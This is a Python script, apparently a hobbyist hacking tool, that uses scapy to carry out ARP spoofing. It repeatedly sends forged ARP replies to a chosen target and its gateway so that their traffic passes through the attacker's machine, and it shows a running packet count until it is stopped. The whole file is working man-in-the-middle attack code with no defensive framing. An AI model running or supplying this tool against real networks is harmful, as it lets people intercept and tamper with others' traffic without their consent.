#!/usr/bin/env python

import scapy.all as scapy
import subprocess
import optparse
import time
import sys
from colorama import Fore

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP address of Target computer.")
    parser.add_option("-g", "--gateway", dest="source", help="Gateway IP.")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please Specify the Target IP, use --help for more info.")
    elif not options.source:
        parser.error("[-] Please Specify a Source IP, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_request
    answer = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    
    for element in answer:
	 mac = element[1].hwsrc
	 return mac

def spoof(tip, sip):
     target_mac = get_mac(tip)
     packet = scapy.ARP(op=2, pdst=tip, hwdst=target_mac, psrc=sip)
     scapy.send(packet, verbose=False)
 
options = get_arguments()

try:
     count_packet = 0
     while True:
	  spoof(options.target, options.source)
	  spoof(options.source, options.target)
	  count_packet = count_packet + 2
	  subprocess.call("clear")
	  print(Fore.GREEN+"\r[+] Packet Sent: "+Fore.BLUE + str(count_packet)),
	  print(Fore.GREEN+"\r\npress CTRL+C to Stop."),
	  sys.stdout.flush()
	  time.sleep(2)
except KeyboardInterrupt:
     print("\n[!] Detected CTRL+C ...... Quitting.")




